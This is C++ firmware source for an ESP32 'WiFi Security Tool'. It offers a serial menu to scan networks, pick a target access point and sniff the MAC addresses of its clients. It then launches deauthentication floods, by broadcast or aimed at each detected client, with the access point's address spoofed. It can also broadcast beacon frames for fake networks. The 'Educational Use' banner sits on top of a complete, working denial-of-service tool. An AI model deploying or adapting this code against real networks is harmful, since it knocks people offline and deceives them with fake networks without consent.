#include "WiFiAttacker/WiFiAttacker.h"
#include "WiFiAttacker/utils/PacketUtils.h"
#include "WiFiAttacker/network/NetworkManager.h"

// Static instance for callback
WiFiAttacker* WiFiAttacker::instance = nullptr;

WiFiAttacker::WiFiAttacker() 
    : attackRunning(false)
    , attackType(0)
    , currentChannel(1)
    , sequenceNum(0)
    , packetsSent(0)
    , attackDelay(100)
    , sniffingEnabled(false)
    , reasonIndex(0) {
    instance = this;
    initializePacketTemplates();
}

void WiFiAttacker::initializePacketTemplates() {
    // Deauth packet template
    uint8_t deauthTemplate[26] = {
        0xC0, 0x00,                         // Frame Control Field (Type=Management, Subtype=Deauth)
        0x3A, 0x01,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (AP)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP MAC)
        0x00, 0x00,                         // Sequence Control
        0x02, 0x00                          // Reason code (2 = Previous authentication no longer valid)
    };
    memcpy(deauthPacket, deauthTemplate, sizeof(deauthTemplate));
}

void WiFiAttacker::setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║   ESP32 WiFi Security Tool v2.0        ║");
    Serial.println("║   Enhanced Edition - Educational Use   ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WiFiAttacker::snifferCallback);
    
    printMenu();
}

void WiFiAttacker::loop() {
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        handleCommand(cmd);
    }
    
    if (attackRunning) {
        if (attackType == 1) {
            // Broadcast deauth
            sendDeauthPacket();
            delay(attackDelay);
        } else if (attackType == 2) {
            // Beacon spam
            sendBeaconSpam();
            delay(attackDelay);
        } else if (attackType == 3) {
            // Targeted deauth to all detected clients
            if (clients.size() > 0) {
                for (auto& client : clients) {
                    sendTargetedDeauth(client.mac);
                    delay(10); // Small delay between clients
                }
            } else {
                // Fallback to broadcast if no clients detected
                sendDeauthPacket();
            }
            delay(attackDelay);
        }
        
        // Print stats every 5 seconds
        if (millis() - attackStartTime > 5000 && (millis() - attackStartTime) % 5000 < 200) {
            printStats();
        }
    }
}

void WiFiAttacker::printMenu() {
    Serial.println("\n╔═══════════════ MENU ═══════════════════╗");
    Serial.println("║ Network Operations:                    ║");
    Serial.println("║  1  - Scan WiFi Networks               ║");
    Serial.println("║  2  - Select Target (2 <index>)        ║");
    Serial.println("║                                        ║");
    Serial.println("║ Attack Operations:                     ║");
    Serial.println("║  3  - Deauth Attack (Broadcast)        ║");
    Serial.println("║  4  - Beacon Spam                      ║");
    Serial.println("║  5  - Targeted Deauth (Smart)          ║");
    Serial.println("║  0  - Stop Attack                      ║");
    Serial.println("║                                        ║");
    Serial.println("║ Client Monitoring:                     ║");
    Serial.println("║  s  - Start Client Sniffer             ║");
    Serial.println("║  x  - Stop Client Sniffer              ║");
    Serial.println("║  l  - List Detected Clients            ║");
    Serial.println("║  c  - Clear Client List                ║");
    Serial.println("║                                        ║");
    Serial.println("║ Configuration:                         ║");
    Serial.println("║  6  - Change Channel (6 <1-13>)        ║");
    Serial.println("║  d  - Set Delay (d <ms>)               ║");
    Serial.println("║  m  - Show Menu                        ║");
    Serial.println("╚════════════════════════════════════════╝");
    Serial.println("\n[STATUS]");
    Serial.println("  Channel: " + String(currentChannel));
    Serial.println("  Target : " + (targetSSID.length() > 0 ? targetSSID : "None"));
    Serial.println("  Delay  : " + String(attackDelay) + "ms");
    Serial.println("  Clients: " + String(clients.size()));
    Serial.println("  Sniffer: " + String(sniffingEnabled ? "ON" : "OFF"));
    Serial.println();
}

void WiFiAttacker::handleCommand(String cmd) {
    if (cmd == "1") {
        scanNetworks();
    } else if (cmd.startsWith("2 ")) {
        int idx = cmd.substring(2).toInt();
        selectTarget(idx);
    } else if (cmd == "3") {
        startDeauthAttack();
    } else if (cmd == "4") {
        startBeaconSpam();
    } else if (cmd == "5") {
        startTargetedDeauth();
    } else if (cmd == "0") {
        stopAttack();
    } else if (cmd == "s") {
        startClientSniffer();
    } else if (cmd == "x") {
        stopClientSniffer();
    } else if (cmd == "l") {
        listClients();
    } else if (cmd == "c") {
        clearClients();
    } else if (cmd.startsWith("6 ")) {
        int ch = cmd.substring(2).toInt();
        changeChannel(ch);
    } else if (cmd.startsWith("d ")) {
        attackDelay = cmd.substring(2).toInt();
        Serial.println("[+] Delay set to: " + String(attackDelay) + "ms");
    } else if (cmd == "m") {
        printMenu();
    } else {
        Serial.println("[-] Unknown command. Type 'm' for menu.");
    }
}

const char* WiFiAttacker::getEncryptionType(wifi_auth_mode_t encryptionType) {
    switch (encryptionType) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA";
        case WIFI_AUTH_WPA2_PSK: return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-E";
        default: return "Unknown";
    }
}

void WiFiAttacker::scanNetworks() {
    Serial.println("\n[*] Scanning WiFi networks...");
    stopAttack();
    stopClientSniffer();
    
    int n = WiFi.scanNetworks();
    
    if (n == 0) {
        Serial.println("[-] No networks found");
    } else {
        Serial.println("\n[+] Found " + String(n) + " networks:\n");
        Serial.println("╔════╤══════════════════════╤══════╤════╤═════════╗");
        Serial.println("║ ID │ SSID                 │ RSSI │ Ch │ Encrypt ║");
        Serial.println("╟────┼──────────────────────┼──────┼────┼─────────╢");
        
        for (int i = 0; i < n && i < 30; i++) {
            char ssid[21];
            String fullSSID = WiFi.SSID(i);
            snprintf(ssid, 21, "%-20s", fullSSID.substring(0, 20).c_str());
            
            Serial.printf("║ %2d │ %s │ %4d │ %2d │ %-7s ║\n",
                i, ssid, WiFi.RSSI(i), WiFi.channel(i),
                getEncryptionType(WiFi.encryptionType(i)));
        }
        Serial.println("╚════╧══════════════════════╧══════╧════╧═════════╝\n");
    }
    
    esp_wifi_set_promiscuous(true);
}

void WiFiAttacker::selectTarget(int index) {
    esp_wifi_set_promiscuous(false);
    int n = WiFi.scanNetworks();
    
    if (index < 0 || index >= n) {
        Serial.println("[-] Invalid network index");
        esp_wifi_set_promiscuous(true);
        return;
    }
    
    targetSSID = WiFi.SSID(index);
    memcpy(targetBSSID, WiFi.BSSID(index), 6);
    currentChannel = WiFi.channel(index);
    
    Serial.println("\n[+] Target Selected:");
    Serial.println("    SSID   : " + targetSSID);
    Serial.printf("    BSSID  : %s\n", macToString(targetBSSID));
    Serial.println("    Channel: " + String(currentChannel));
    Serial.println("    Encrypt: " + String(getEncryptionType(WiFi.encryptionType(index))));
    
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    
    // Auto-start sniffer
    clearClients();
    startClientSniffer();
}

void WiFiAttacker::startDeauthAttack() {
    if (targetSSID.length() == 0) {
        Serial.println("[-] No target selected. Use '2 <index>' first.");
        return;
    }
    
    Serial.println("\n[!] Starting Broadcast Deauth Attack");
    Serial.println("[!] Target: " + targetSSID);
    Serial.println("[!] Mode: Broadcast (all clients)");
    Serial.println("[!] Press '0' to stop\n");
    
    memcpy(&deauthPacket[10], targetBSSID, 6); // Source (AP)
    memcpy(&deauthPacket[16], targetBSSID, 6); // BSSID
    
    attackType = 1;
    attackRunning = true;
    packetsSent = 0;
    attackStartTime = millis();
}

void WiFiAttacker::sendDeauthPacket() {
    // Ensure we're in the right channel
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    // Set up promiscuous filter for management frames
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    
    // Configure for sending management frames
    esp_wifi_set_promiscuous(true);
    
    // Update destination (broadcast)
    memset(&deauthPacket[4], 0xFF, 6);
    
    // Update sequence number
    PacketUtils::updateSequence(deauthPacket, sequenceNum);
    
    // Rotate reason code
    PacketUtils::rotateReasonCode(reasonIndex);
    deauthPacket[24] = PacketUtils::reasonCodes[reasonIndex];
    
    // Send frame
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    
    if (result == ESP_OK) {
        packetsSent++;
        Serial.print(".");
    } else {
        Serial.print("X");
    }
    
    delay(1); // Small delay between packets
}

void WiFiAttacker::startTargetedDeauth() {
    if (targetSSID.length() == 0) {
        Serial.println("[-] No target selected. Use '2 <index>' first.");
        return;
    }
    
    Serial.println("\n[!] Starting Targeted Deauth Attack");
    Serial.println("[!] Target: " + targetSSID);
    Serial.println("[!] Mode: Smart targeting");
    
    if (clients.size() == 0) {
        Serial.println("[!] No clients detected yet. Starting sniffer...");
        Serial.println("[!] Attack will begin automatically when clients found");
        startClientSniffer();
    } else {
        Serial.println("[!] Targeting " + String(clients.size()) + " detected clients");
    }
    
    Serial.println("[!] Press '0' to stop\n");
    
    memcpy(&deauthPacket[10], targetBSSID, 6);
    memcpy(&deauthPacket[16], targetBSSID, 6);
    
    attackType = 3;
    attackRunning = true;
    packetsSent = 0;
    attackStartTime = millis();
}

void WiFiAttacker::sendTargetedDeauth(uint8_t* clientMAC) {
    memcpy(&deauthPacket[4], clientMAC, 6); // Destination: specific client
    
    updateSequence(deauthPacket);
    rotateReasonCode();
    deauthPacket[24] = reasonCodes[reasonIndex];
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    
    if (result == ESP_OK) {
        packetsSent++;
        Serial.print("*");
    }
}

void WiFiAttacker::startBeaconSpam() {
    Serial.println("\n[!] Starting Beacon Spam Attack");
    Serial.println("[!] Creating fake WiFi networks");
    Serial.println("[!] Press '0' to stop\n");
    
    attackType = 2;
    attackRunning = true;
    packetsSent = 0;
    attackStartTime = millis();
}

void WiFiAttacker::sendBeaconSpam() {
    // Generate random SSID
    char fakeSSID[PacketUtils::MAX_SSID_LENGTH + 1];
    const char* prefixes[] = {"FREE_", "WiFi_", "Guest_", "Public_", "Open_", "Net_"};
    snprintf(fakeSSID, PacketUtils::MAX_SSID_LENGTH, "%s%04X", prefixes[random(6)], random(0x10000));
    
    uint8_t packet[PacketUtils::MAX_PACKET_SIZE];
    uint16_t packetSize = PacketUtils::createBeaconFrame(packet, fakeSSID, currentChannel);
    
    PacketUtils::updateSequence(packet, sequenceNum);
    
    // Make sure we're in the right mode and channel
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, packet, packetSize, false);
    
    if (result == ESP_OK) {
        packetsSent++;
        Serial.print("+");
    } else {
        Serial.print("X");
    }
}

void WiFiAttacker::stopAttack() {
    if (!attackRunning) {
        Serial.println("[-] No attack running");
        return;
    }
    
    attackRunning = false;
    uint32_t duration = (millis() - attackStartTime) / 1000;
    
    Serial.println("\n\n[!] Attack Stopped");
    Serial.println("╔═══════════ STATISTICS ═════════════╗");
    Serial.println("║ Duration : " + String(duration) + " seconds");
    Serial.println("║ Packets  : " + String(packetsSent));
    Serial.println("║ Rate     : " + String(packetsSent / max(duration, 1U)) + " pkt/s");
    Serial.println("╚════════════════════════════════════╝\n");
    
    attackType = 0;
    packetsSent = 0;
    printMenu();
}

void WiFiAttacker::changeChannel(int channel) {
    if (channel < 1 || channel > 13) {
        Serial.println("[-] Invalid channel (1-13)");
        return;
    }
    
    currentChannel = channel;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    Serial.println("[+] Channel changed to: " + String(currentChannel));
}

// ============ CLIENT SNIFFER FUNCTIONS ============

void IRAM_ATTR WiFiAttacker::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance && instance->sniffingEnabled) {
        instance->processSniffedPacket(buf, type);
    }
}

void WiFiAttacker::processSniffedPacket(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    // Extract MAC addresses from frame
    uint8_t frameType = payload[0];
    uint8_t frameSubtype = (frameType & 0xF0) >> 4;
    
    // Check if it's from our target AP
    uint8_t* bssid = &payload[16]; // BSSID location
    
    if (targetSSID.length() > 0 && memcmp(bssid, targetBSSID, 6) == 0) {
        // Get client MAC (source or destination depending on frame direction)
        uint8_t* clientMAC = nullptr;
        
        // If frame is from AP to client, client is destination (addr1)
        // If frame is from client to AP, client is source (addr2)
        uint8_t* addr1 = &payload[4];
        uint8_t* addr2 = &payload[10];
        
        if (memcmp(addr2, targetBSSID, 6) != 0) {
            clientMAC = addr2; // Source is client
        } else if (memcmp(addr1, targetBSSID, 6) != 0) {
            clientMAC = addr1; // Destination is client
        }
        
        if (clientMAC && !(clientMAC[0] & 0x01)) { // Not multicast/broadcast
            addOrUpdateClient(clientMAC, rssi);
        }
    }
}

void WiFiAttacker::addOrUpdateClient(uint8_t* mac, int8_t rssi) {
    uint32_t now = millis();
    
    // Check if client already exists
    for (auto& client : clients) {
        if (memcmp(client.mac, mac, 6) == 0) {
            client.rssi = rssi;
            client.lastSeen = now;
            client.packets++;
            return;
        }
    }
    
    // Add new client
    ClientDevice newClient;
    memcpy(newClient.mac, mac, 6);
    newClient.rssi = rssi;
    newClient.lastSeen = now;
    newClient.packets = 1;
    clients.push_back(newClient);
    
    Serial.printf("\n[+] New client detected: %s (RSSI: %d)\n", macToString(mac), rssi);
}

void WiFiAttacker::startClientSniffer() {
    if (targetSSID.length() == 0) {
        Serial.println("[-] Select a target first with '2 <index>'");
        return;
    }
    
    sniffingEnabled = true;
    Serial.println("[+] Client sniffer started");
    Serial.println("[*] Monitoring channel " + String(currentChannel) + " for clients...");
}

void WiFiAttacker::stopClientSniffer() {
    sniffingEnabled = false;
    Serial.println("[+] Client sniffer stopped");
}

void WiFiAttacker::listClients() {
    if (clients.size() == 0) {
        Serial.println("[-] No clients detected yet");
        return;
    }
    
    Serial.println("\n╔═══════════ DETECTED CLIENTS ═══════════╗");
    Serial.println("║ #  │ MAC Address       │ RSSI │ Pkts   ║");
    Serial.println("╟────┼───────────────────┼──────┼────────╢");
    
    for (size_t i = 0; i < clients.size(); i++) {
        Serial.printf("║ %2d │ %s │ %4d │ %6d ║\n",
            i, macToString(clients[i].mac), clients[i].rssi, clients[i].packets);
    }
    Serial.println("╚════════════════════════════════════════╝\n");
}

void WiFiAttacker::clearClients() {
    clients.clear();
    Serial.println("[+] Client list cleared");
}

// ============ HELPER FUNCTIONS ============

void WiFiAttacker::updateSequence(uint8_t* packet) {
    packet[22] = (sequenceNum & 0x0F) << 4;
    packet[23] = (sequenceNum & 0x0FF0) >> 4;
    sequenceNum = (sequenceNum + 1) % 4096;
}

void WiFiAttacker::rotateReasonCode() {
    reasonIndex = (reasonIndex + 1) % 6;
}

const char* WiFiAttacker::macToString(const uint8_t* mac) {
    static char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
        mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return macStr;
}

void WiFiAttacker::printStats() {
    uint32_t duration = (millis() - attackStartTime) / 1000;
    uint32_t rate = duration > 0 ? packetsSent / duration : 0;
    
    Serial.printf("\n[Stats] Packets: %u | Rate: %u pkt/s | Clients: %u\n",
        packetsSent, rate, clients.size());
}